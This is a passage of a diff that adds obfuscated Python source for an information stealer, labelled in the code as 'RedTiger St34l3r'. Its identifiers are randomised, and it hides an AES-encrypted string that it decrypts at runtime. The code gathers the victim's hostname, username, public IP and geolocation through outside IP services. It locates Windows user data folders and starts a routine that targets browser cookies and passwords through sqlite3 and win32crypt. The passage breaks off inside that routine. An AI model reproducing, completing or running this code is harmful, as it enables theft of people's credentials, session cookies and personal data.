+    XWVIZQTTQWCVLEQUILKVIWSQPQHTYJIBXNMIGCBDXXWLHTJHQWMVMNOGDFZ = None
+    return XWVIZQTTQWCVLEQUILKVIWSQPQHTYJIBXNMIGCBDXXWLHTJHQWMVMNOGDFZ
+
+def TFYOYIQBRZYQDITODESBPVCNLYMOETCEKDMYPOAGBMSKFSWNIMAOVWOEG(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN):
+    SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_camera_capture = None
+    return SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_camera_capture
+
+def ZJDPUHCXAXJRLRCGFMMLMGORGYNXDIWAPXILIJJTZERZTPIHDCKILVYNWBALBAQBQZXHHWFOFJLFVLZNNUKUFOGDYQSRZDCWFMR(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN): 
+    MUBQQLNGLUUZFFNPXHQFPECBBWMMEJHPMWRLCPCRJVWOMIBQFHXRWWWQIAOUH = None
+    return MUBQQLNGLUUZFFNPXHQFPECBBWMMEJHPMWRLCPCRJVWOMIBQFHXRWWWQIAOUH
+
+def ALPEMFZZHTLOCAUVNJGXKLOZEBJJDNLQHJNMHUVJUKTEVJBOIN(): pass
+def TTJZJMNQJKUWRGFCIFTHCCIQDDLNIKFEKYAKJAAMKBLGHIRZWPJIQQJMZNOGNFDEILPAISYSMASUPZRYOUTIRZQ(): pass
+def SQCPVEKHDFDYZCQVCZWQAKIASHZSZBFTNVHLYBIIESUYQTOUBYRBFHKYHGOKJTYHQYQ(): pass
+def OEUWLIXWCOACJVSRURQCEVRFOYSPLULOKPOPHPPKNLERVZKTAHET(): pass
+def HSKEQYKYFBRFHCXFWUSNZUIXDGKGTKNIWQMHDQQGBYKBEFTUNQZTAJYYPWPIWIXZAWG(): pass
+def ERIRZYTLNNNSASBQRUGNSVAHKLQCHNPVZNNDCHCLAMAXZBOIJNFIUDHDAGNUIHESRXUHPVLQVMDHE(): pass
+def ZKWVRDMAHFXKEDDBNBAFJOFYZAFMSVLDJTHEJWUOXUREVNPIBMPRSCXVQVLQSBCGMSKQLNE(): pass
+def KQTFNHGVDNMUADSDUWPZBXGHSCKHNFLRXWWKWEYCVYDCUPJDFILKDYAIJVIHZDHXJSBIJDZCLTKMWFFEDWH(): pass
+def MHQAPGULMTSFYIVOIOLXSRDEGYJJXEXCMLOWWYZYMLLVBHNKDHFAPJZMQKSPKGAUDMHLSNPDN(): pass
+def CCODEIDTNEEHXGXEQCVGVUKMKZJXXGCQEMXPKHVOJIQODBMGDDRAMPBXZQVCMGB(): pass
+def EWJSEZCHTXQWSAZQFLIWCEPXZWDPKYACQVIXXCLHPYMJPATLGIFMIZMTAEZHZZUQYLVHBJQIMGIUKULCORWZWUTVCEDHXEH(): pass
+def TNYFJMINIOWHXDXYAZNTSGDPYPLKEIPAPBQDQYGQIMSGBOVVABHMYQS(): pass
+
+def GSYPFDORHYERPAZOUAEYFCGMNEEYMYEBSUINBAEUKBXCKUPIVU(title):
+    try:
+        if sys.platform.startswith("win"):
+            ctypes.windll.kernel32.SetConsoleTitleW(title)
+        elif sys.platform.startswith("linux"):
+            sys.stdout.write(f"\x1b]2;{title}\x07")
+    except:
+        pass
+        
+def FKRHXBMWFBEAJTXJAINIRXUDBZLXRNYZOJZFOOPVELTIVKMNUIHMSTDPZGGGYVILWZKSQJHLIPKYK():
+    try:
+        if sys.platform.startswith("win"):
+            os.system("cls")
+        elif sys.platform.startswith("linux"):
+            os.system("clear")
+    except:
+        pass
+
+def FPRCCTPOILPWASZPIGQNYELXAZENAMYTIPVYHBUZFVYUFUHEIZYSQKHFZEMFOIWKGDTDJIRHMKCHHWNFNFFLZTWWDQNQ(VHJYJEINTPJLVCYIZHBFMWTEGNAUZWPIIUYLCXRQAGNIXWIMOUEEDQMDEMHRQH, XFABNCMTWECEOSGNJFFAPZOVYLTGIQDMYMQKTOUGJLDEQMESFQOUAZYADQ):
+    def CEWIWZBHTKKBXRHNPHYPIOQOHXAEGOSIVAKUOMGMDJISZOYACJRHXZQVPDWZFOYMC(XQZCLGYIWDPWGFUKLJCFHKVAXUPJHSYDFQSRKLCTXPVJWSUDPXDPAGZFJ, YQXLQLBGJZTGPPHPJLVSFUBGHNUMAUFQTIAXANYWJKTYHVJEPIQCVQCJQRN):
+        MQKWMWCNQBZUFAZMJRFSFOZJTOCYZLHXYYHSOJSUGEIMTSQPTLVJSKFXGTJATDI = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=YQXLQLBGJZTGPPHPJLVSFUBGHNUMAUFQTIAXANYWJKTYHVJEPIQCVQCJQRN, iterations=100000, backend=default_backend())
+        if isinstance(XQZCLGYIWDPWGFUKLJCFHKVAXUPJHSYDFQSRKLCTXPVJWSUDPXDPAGZFJ, str):  
+            XQZCLGYIWDPWGFUKLJCFHKVAXUPJHSYDFQSRKLCTXPVJWSUDPXDPAGZFJ = XQZCLGYIWDPWGFUKLJCFHKVAXUPJHSYDFQSRKLCTXPVJWSUDPXDPAGZFJ.encode()  
+        return MQKWMWCNQBZUFAZMJRFSFOZJTOCYZLHXYYHSOJSUGEIMTSQPTLVJSKFXGTJATDI.derive(XQZCLGYIWDPWGFUKLJCFHKVAXUPJHSYDFQSRKLCTXPVJWSUDPXDPAGZFJ)
+
+    VHJYJEINTPJLVCYIZHBFMWTEGNAUZWPIIUYLCXRQAGNIXWIMOUEEDQMDEMHRQH_data = base64.b64decode(VHJYJEINTPJLVCYIZHBFMWTEGNAUZWPIIUYLCXRQAGNIXWIMOUEEDQMDEMHRQH)
+    YQXLQLBGJZTGPPHPJLVSFUBGHNUMAUFQTIAXANYWJKTYHVJEPIQCVQCJQRN = VHJYJEINTPJLVCYIZHBFMWTEGNAUZWPIIUYLCXRQAGNIXWIMOUEEDQMDEMHRQH_data[:16]
+    UXILDTRAYRMBPEFPPZKDECXVJVFUNSXEJMJSIFGIMXTBJPQTFOFUPJBUOVMYVVZWSWXWSBTLIGMOKMBXWNWJWNYOWLPQLGUXLIJ = VHJYJEINTPJLVCYIZHBFMWTEGNAUZWPIIUYLCXRQAGNIXWIMOUEEDQMDEMHRQH_data[16:32]
+    VHJYJEINTPJLVCYIZHBFMWTEGNAUZWPIIUYLCXRQAGNIXWIMOUEEDQMDEMHRQH_data = VHJYJEINTPJLVCYIZHBFMWTEGNAUZWPIIUYLCXRQAGNIXWIMOUEEDQMDEMHRQH_data[32:]
+    DCQVUBVVWYVQUKEPWWDYRRMMHUINLMYQSYKLAHPRQZSGQOPEGVGTBAHXZYKGNEHZFMLYQPOCYGTQMIKVVYWMUCQIOMDO = CEWIWZBHTKKBXRHNPHYPIOQOHXAEGOSIVAKUOMGMDJISZOYACJRHXZQVPDWZFOYMC(XFABNCMTWECEOSGNJFFAPZOVYLTGIQDMYMQKTOUGJLDEQMESFQOUAZYADQ, YQXLQLBGJZTGPPHPJLVSFUBGHNUMAUFQTIAXANYWJKTYHVJEPIQCVQCJQRN)
+    GMXYMNHCXMQXEKAWMEXGRTHTOCTFHNZWKCZWYHGVIAPUIIAYMNMTZOJJSFDSFPNOVENKUXPJRJPVAWMS = Cipher(algorithms.AES(DCQVUBVVWYVQUKEPWWDYRRMMHUINLMYQSYKLAHPRQZSGQOPEGVGTBAHXZYKGNEHZFMLYQPOCYGTQMIKVVYWMUCQIOMDO), modes.CBC(UXILDTRAYRMBPEFPPZKDECXVJVFUNSXEJMJSIFGIMXTBJPQTFOFUPJBUOVMYVVZWSWXWSBTLIGMOKMBXWNWJWNYOWLPQLGUXLIJ), backend=default_backend())
+    BZKRJNJJZBZVVAFONBSKSWUIMOHCPMWEFKRFFRYMPYDJFSTERRBPEIEISKOXPPBMWDSYSODXEOGRPQWHICDHG = GMXYMNHCXMQXEKAWMEXGRTHTOCTFHNZWKCZWYHGVIAPUIIAYMNMTZOJJSFDSFPNOVENKUXPJRJPVAWMS.decryptor()
+    GLJIGWFXRTGRPFBEETVOQZJVCABOWEANFYPNYXLRPYRNSQYETIKWQENQSQAZU = BZKRJNJJZBZVVAFONBSKSWUIMOHCPMWEFKRFFRYMPYDJFSTERRBPEIEISKOXPPBMWDSYSODXEOGRPQWHICDHG.update(VHJYJEINTPJLVCYIZHBFMWTEGNAUZWPIIUYLCXRQAGNIXWIMOUEEDQMDEMHRQH_data) + BZKRJNJJZBZVVAFONBSKSWUIMOHCPMWEFKRFFRYMPYDJFSTERRBPEIEISKOXPPBMWDSYSODXEOGRPQWHICDHG.finalize()
+    ZQMVEXCLGPGNJMAOPZHSTXPEAJENQYSFZCYKBIHUYHDIJGVCNVHIWMJFGBUOXZEWXJDUTTSDIUEMDMKDJPILRCLZPJW = padding.PKCS7(128).unpadder()
+    BHFPSSTNERLEVKJFSNRNKLLCHKGXCTGZJYFWMRMTBAIFQUCYNXYXGFONJYQQLYPUKRQJNTDYLDJVNBLWVRP = ZQMVEXCLGPGNJMAOPZHSTXPEAJENQYSFZCYKBIHUYHDIJGVCNVHIWMJFGBUOXZEWXJDUTTSDIUEMDMKDJPILRCLZPJW.update(GLJIGWFXRTGRPFBEETVOQZJVCABOWEANFYPNYXLRPYRNSQYETIKWQENQSQAZU) + ZQMVEXCLGPGNJMAOPZHSTXPEAJENQYSFZCYKBIHUYHDIJGVCNVHIWMJFGBUOXZEWXJDUTTSDIUEMDMKDJPILRCLZPJW.finalize()
+    return BHFPSSTNERLEVKJFSNRNKLLCHKGXCTGZJYFWMRMTBAIFQUCYNXYXGFONJYQQLYPUKRQJNTDYLDJVNBLWVRP.decode()
+
+GSYPFDORHYERPAZOUAEYFCGMNEEYMYEBSUINBAEUKBXCKUPIVU("")
+
+try: LUSHYYGZDBFVECDHWXJUUSCFQWXHZIOOKVAGHQXQKDZTPDIBUEDLRWJSLXQFT    = socket.gethostname()
+except: LUSHYYGZDBFVECDHWXJUUSCFQWXHZIOOKVAGHQXQKDZTPDIBUEDLRWJSLXQFT = "None"
+
+try: VIDQWDOLEYGAVEHPTVBEKGLESFBQTJTBKIFXZRBQICQAMZBEFWEES    = os.getlogin()
+except: VIDQWDOLEYGAVEHPTVBEKGLESFBQTJTBKIFXZRBQICQAMZBEFWEES = "None"
+
+try: SRDJBHDRCAMABOSOJLTOEJKFTJTIUMCBIPVDPZCMUPMALZPGKCNFEHRSUIXAUOKRHWLFWWWZDRZ    = win32api.GetUserNameEx(win32api.NameDisplay)
+except: SRDJBHDRCAMABOSOJLTOEJKFTJTIUMCBIPVDPZCMUPMALZPGKCNFEHRSUIXAUOKRHWLFWWWZDRZ = "None"
+
+try: FHFXPSWNYJPVSBEBPNZHNSIWQJJRKHCNLRISTUAQHRTINCLDLVTXYGRIUNS    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
+except: FHFXPSWNYJPVSBEBPNZHNSIWQJJRKHCNLRISTUAQHRTINCLDLVTXYGRIUNS = "None"
+
+try: DMSROZDPFWFENEAQTMHUHIFIEMFMSWPCGTQKDPCYPKRXVQKDAQGXIPJYTLLCSDC    = socket.gethostbyname(socket.gethostname())
+except: DMSROZDPFWFENEAQTMHUHIFIEMFMSWPCGTQKDPCYPKRXVQKDAQGXIPJYTLLCSDC = "None"
+
+YIJEOLTXCECOEXPCRPVVAQGDOFKIFWLXYOUQHVEXLFOTXJTTYJTKXEHSPYNNFJMELQFIOVWEOUQXGTFYBWRHNGJQT = r"""
+G05OUBI5lVwUk5bASS4XMGjEAcSs9T7wmgt5rUzUfUWiZM99hUhR/GrQxdB3P728HEHywEUeaRfGjbA1LclK7HxuJ+FY9fhi+rtOCP7ORUmtsTceQMjBw4B7S3a7hHFswp0p6xF7lLbP0hM6cGjOKfsC7yeSVusRkS/PFi1kMC/M/TqTLpTMBLAGJBE98QItDW3m/Lw/HsExI4M3suHMbw==
+"""
+
+ZUSBVIACEHKEDNCOJJPOWRLGANGEPHQUCSQTHWIBHHRLZCJCNHFSJGKKQLLFSOFRFJAKCNXNEFEIEIVPASPPENGTND            = "bjjgTQJgHjDNhlCJkRxVhLKCrxSEJoSakCSHVqJTWZvPWgqBvIJkjmBdHLBVpuleLtTZvWSofHEJWXYkOBuDIcioIkFWZktcszxbGZIjQwpTfwHuCHSAcOXDnRAcSFJVtqYuCoUnBWQpytTVdSgcCtMdoqSxXGNxMCTyN"
+DZSJHLZDGOUDLKDCALHDBSIRHXSLLTZOMLASMAKBVKUSPSRCBGENCLBMNLGTGHVPSAEHATYDMXG        = "None"
+HXNTMMMFVQAPEKRYAZIXOSXHLAPUVKZZNCHXBBXBYPPOLQQRTJJHSMXIUZVBWJDLYEAUSBEFY    = 0xa80505
+IYMCUSRZQXXWNSVQDSCRWYYYFFCGFJHDLUPSQVBALSOIJNGWJLVTJQVKDKELTTJUPOMDUZBCRNICTLZLCUNSWRSAJNY = "RedTiger St34l3r"
+PWAJDAXHOWYNFMQWQVLNBNHRBZRGDRMBJDVZWFTSNLOCCULBRJCHILULPIUUNGWZN   = "https://google.com"
+JKEGKJLAELZKSLRJWGUUHULOTAYILBAVZUBRKXBEDVZAXJIPVOXJBLXHRGESWFCQIJNBUCCIBZQJDTHJA    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
+QURJULETHLTXZGLSUOCAMPCERHJADCXANJAJQAQQFXULAPKBTVNOCZBQRVZASHIUXS   = {"text": JKEGKJLAELZKSLRJWGUUHULOTAYILBAVZUBRKXBEDVZAXJIPVOXJBLXHRGESWFCQIJNBUCCIBZQJDTHJA, "icon_url": PWAJDAXHOWYNFMQWQVLNBNHRBZRGDRMBJDVZWFTSNLOCCULBRJCHILULPIUUNGWZN}
+KYHQICBGGVZPNAUDCUFIRSKVJRDFIGTKTTTOLTCYHOXGBOPZCNLILUDSGCXVKMVADAXF    = f'`{VIDQWDOLEYGAVEHPTVBEKGLESFBQTJTBKIFXZRBQICQAMZBEFWEES} "{FHFXPSWNYJPVSBEBPNZHNSIWQJJRKHCNLRISTUAQHRTINCLDLVTXYGRIUNS}"`'
+IKOSVDHPBURSHOHFGMKXQVYTNAGLKBWSKAXXRYLNJDWLKBOUPATHKGHSIOTYYIBWKNMLZFHBYH    = FPRCCTPOILPWASZPIGQNYELXAZENAMYTIPVYHBUZFVYUFUHEIZYSQKHFZEMFOIWKGDTDJIRHMKCHHWNFNFFLZTWWDQNQ(YIJEOLTXCECOEXPCRPVVAQGDOFKIFWLXYOUQHVEXLFOTXJTTYJTKXEHSPYNNFJMELQFIOVWEOUQXGTFYBWRHNGJQT, ZUSBVIACEHKEDNCOJJPOWRLGANGEPHQUCSQTHWIBHHRLZCJCNHFSJGKKQLLFSOFRFJAKCNXNEFEIEIVPASPPENGTND)
+
+BZWNZAESIZECWCPHLACTQUSYIFEJEXTMMRDPXSUDJQOWOWHSGYUXQPILXWUTPU           = os.getenv("WINDIR", None)
+AZPBBRLAEPAAXZVZXAMHBOSWXOSEBRUYWBGVOFQMJGPIJZTVNJRFGLLIGYBAXUACXOWTGBUXIVAIDKLIKBUDUBHJBRCRQ       = os.getenv('USERPROFILE', None)
+IYCJMDLTKQZVDIDVQOEJGKPLDJYXDZJYIYFAQFJEDMFJREAHCRWWPGEPNPFVAMFDFWUQMLBYNIJLSA     = os.getenv('LOCALAPPDATA', None)
+UBYLEOOXGKEUARAUZESDNQFHTZMFHFFVYIKNMJTQISZPOATEZWUNMILCS   = os.getenv('APPDATA', None)
+PRBMVMOMIXWXKXFRNLEOQWOFYRVZMTSVWMQPRANARZMCDQUNWBWXMEPDAJWEJYYIBJIKMKZOGCAFNDTYPXFBSUXBYOLTEEDZGOF = os.getenv('ProgramFiles(x86)', None)
+if PRBMVMOMIXWXKXFRNLEOQWOFYRVZMTSVWMQPRANARZMCDQUNWBWXMEPDAJWEJYYIBJIKMKZOGCAFNDTYPXFBSUXBYOLTEEDZGOF is None:
+    PRBMVMOMIXWXKXFRNLEOQWOFYRVZMTSVWMQPRANARZMCDQUNWBWXMEPDAJWEJYYIBJIKMKZOGCAFNDTYPXFBSUXBYOLTEEDZGOF = os.getenv('ProgramFiles', None)
+
+try:
+    UAZKKNJMDOMDSNOBIJFIOMVXIQHOZTTBENSUMCNEPDBRBDARWBOSBQFNTMPCMPYRUNPTXYOKNTEXP = requests.get(f"https://{DZSJHLZDGOUDLKDCALHDBSIRHXSLLTZOMLASMAKBVKUSPSRCBGENCLBMNLGTGHVPSAEHATYDMXG}/api/ip/ip={FHFXPSWNYJPVSBEBPNZHNSIWQJJRKHCNLRISTUAQHRTINCLDLVTXYGRIUNS}")
+    YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO = UAZKKNJMDOMDSNOBIJFIOMVXIQHOZTTBENSUMCNEPDBRBDARWBOSBQFNTMPCMPYRUNPTXYOKNTEXP.json()
+
+    OLUFNHHTJWLATNSUYEXTXTFHHYOKCXUYCXLJAFHCLTUVYVHBZBMKLAWFHZBJ = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('country', "None")
+    OLUFNHHTJWLATNSUYEXTXTFHHYOKCXUYCXLJAFHCLTUVYVHBZBMKLAWFHZBJ_code = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('country_code', "None")
+    LJFWHXPZQBJKVEIPAUWHDNEYVMPKYVFFXZAXMCENBSCLVCLPEDETXDPEQHYIFUASZDVVBQSEBSFZFAPZGGHNTC = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('region', "None")
+    LJFWHXPZQBJKVEIPAUWHDNEYVMPKYVFFXZAXMCENBSCLVCLPEDETXDPEQHYIFUASZDVVBQSEBSFZFAPZGGHNTC_code = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('region_code', "None")
+    ENIBKQIJXZKYDZTGIPDEYXWDGRJDIWXXOUZYSCYTMGWIAHADSRVICIWUUUQMWWAZQOQSIAANRNDWRFACVEAWWQHNRHPBRIAJCD = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('zip', "None")
+    LGYRSHVWZOWWPOQATSYSLJNPPEYEFUPBILHFNPYSVJXRHGCIARCOJHSUSBGCUSBMVGYLSIOXYYUIB = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('city', "None")
+    UPIQLGOILRPSHTQJHOCJPINTULFWZUSMWKRQUIXPUKCJSIDWXYAUNKNGFDHJGLNRQFUYYSWKAWAHKKVCQVWXBNIOYXXMNIVPWDG = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('latitude', "None")
+    RTEORFQFGPDMZPCBPCYRHFCVGIKRCLQWDCXKYVLTCHNELDHEDAUJPRFPFJPKVIHYPEMIFWVXDEVINMIQCQPLVTACTJ = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('longitude', "None")
+    ZTLKODLHPVINHFECIEDRKNPBMNALKNMHMAUAZUKAXMQUAVSMEFYZIQMYNCLDPFVDIUIVUPPKDAPRNDNPNERODCGVNFJT = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('timezone', "None")
+    RWZMYEZIHQTGLSQVKQILVOKSBJCXHXIEEJEAWYKSEUXTVBZVBKJVYRYVNWZYLRORTHCDSBPQORGKMJYQHCGUDKNTVFBMFG = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('isp', "None")
+    EXWNVTLJTLUEJEJGOXYORXBJNPPQFUTYCAZSONVWJXTOFUXCJAJPFWAQYHHFVDRGKNYRJXZKMAXTUUVBJFW = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('org', "None")
+    XTSKBDZKVNVUOGBTSPVSMWDBFBSJKMZGYICTRXHEJFMLWOYMTYLDYSJKVQRFOLAOEZVFEXGIFULYFDGFN = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('as', "None")
+except:
+    UAZKKNJMDOMDSNOBIJFIOMVXIQHOZTTBENSUMCNEPDBRBDARWBOSBQFNTMPCMPYRUNPTXYOKNTEXP = requests.get(f"http://ip-api.com/json/{FHFXPSWNYJPVSBEBPNZHNSIWQJJRKHCNLRISTUAQHRTINCLDLVTXYGRIUNS}")
+    YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO = UAZKKNJMDOMDSNOBIJFIOMVXIQHOZTTBENSUMCNEPDBRBDARWBOSBQFNTMPCMPYRUNPTXYOKNTEXP.json()
+
+    OLUFNHHTJWLATNSUYEXTXTFHHYOKCXUYCXLJAFHCLTUVYVHBZBMKLAWFHZBJ = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('country', "None")
+    OLUFNHHTJWLATNSUYEXTXTFHHYOKCXUYCXLJAFHCLTUVYVHBZBMKLAWFHZBJ_code = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('countryCode', "None")
+    LJFWHXPZQBJKVEIPAUWHDNEYVMPKYVFFXZAXMCENBSCLVCLPEDETXDPEQHYIFUASZDVVBQSEBSFZFAPZGGHNTC = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('regionName', "None")
+    LJFWHXPZQBJKVEIPAUWHDNEYVMPKYVFFXZAXMCENBSCLVCLPEDETXDPEQHYIFUASZDVVBQSEBSFZFAPZGGHNTC_code = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('region', "None")
+    ENIBKQIJXZKYDZTGIPDEYXWDGRJDIWXXOUZYSCYTMGWIAHADSRVICIWUUUQMWWAZQOQSIAANRNDWRFACVEAWWQHNRHPBRIAJCD = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('zip', "None")
+    LGYRSHVWZOWWPOQATSYSLJNPPEYEFUPBILHFNPYSVJXRHGCIARCOJHSUSBGCUSBMVGYLSIOXYYUIB = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('city', "None")
+    UPIQLGOILRPSHTQJHOCJPINTULFWZUSMWKRQUIXPUKCJSIDWXYAUNKNGFDHJGLNRQFUYYSWKAWAHKKVCQVWXBNIOYXXMNIVPWDG = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('lat', "None")
+    RTEORFQFGPDMZPCBPCYRHFCVGIKRCLQWDCXKYVLTCHNELDHEDAUJPRFPFJPKVIHYPEMIFWVXDEVINMIQCQPLVTACTJ = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('lon', "None")
+    ZTLKODLHPVINHFECIEDRKNPBMNALKNMHMAUAZUKAXMQUAVSMEFYZIQMYNCLDPFVDIUIVUPPKDAPRNDNPNERODCGVNFJT = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('timezone', "None")
+    RWZMYEZIHQTGLSQVKQILVOKSBJCXHXIEEJEAWYKSEUXTVBZVBKJVYRYVNWZYLRORTHCDSBPQORGKMJYQHCGUDKNTVFBMFG = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('isp', "None")
+    EXWNVTLJTLUEJEJGOXYORXBJNPPQFUTYCAZSONVWJXTOFUXCJAJPFWAQYHHFVDRGKNYRJXZKMAXTUUVBJFW = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('org', "None")
+    XTSKBDZKVNVUOGBTSPVSMWDBFBSJKMZGYICTRXHEJFMLWOYMTYLDYSJKVQRFOLAOEZVFEXGIFULYFDGFN = YGKWOBNCRDZJFUNWDMEDGHLMVNVUQFSCBASGWJDPTJKJHXIBMGLFTZLTXLBDIKVPBLANFGDOQCYPTTAQMCXGHJTZGIO.get('as', "None")
+
+def FXZQPCMPDJKPWZPVXSQNPJTPTBBWFVRSGSSQFBSUIIQKIQWTNHVR(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN):
+    import os
+    import psutil
+    import json
+    import base64
+    import sqlite3
+    import win32crypt
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+
+    global VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ, VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ, MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU, JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW, GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC, QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU
+
+    NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH = ["cookies"]
+    OQTIHFROGQIRAOSXSGBYIHOSOWVSPBHUDMPEAYTBKILRQTYLQQJNYDQAHHGUSXEXITMUJLPVTGJERCWBBYHG = []
+
+    if "extentions" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ = 0
+    else:
+        VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ = None
+
+    if "passwords" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        BXMYTLNHTBXDTXSIRZTNNYESIMQNOXATIWMIQRCZDJDLQXHWIM = []
+        VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ = 0
+    else:
+        BXMYTLNHTBXDTXSIRZTNNYESIMQNOXATIWMIQRCZDJDLQXHWIM = ""
+        VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ = None
